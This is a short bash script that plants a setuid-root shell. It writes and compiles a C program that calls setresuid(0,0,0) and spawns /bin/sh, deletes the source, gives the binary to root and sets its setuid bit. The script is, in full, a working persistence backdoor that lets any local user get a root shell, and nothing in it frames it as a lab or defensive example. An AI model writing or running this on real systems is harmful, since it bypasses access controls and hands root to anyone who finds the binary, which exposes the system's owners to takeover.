#!/bin/bash

# Create the C source file with the privileged shell code
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > privshell.c

# Compile the C source file into a binary executable
gcc -o privshell privshell.c

# Remove the C source file
rm privshell.c

# Set the owner of the binary to root
chown root:root privshell

# Set the setuid bit on the binary
chmod u+s privshell
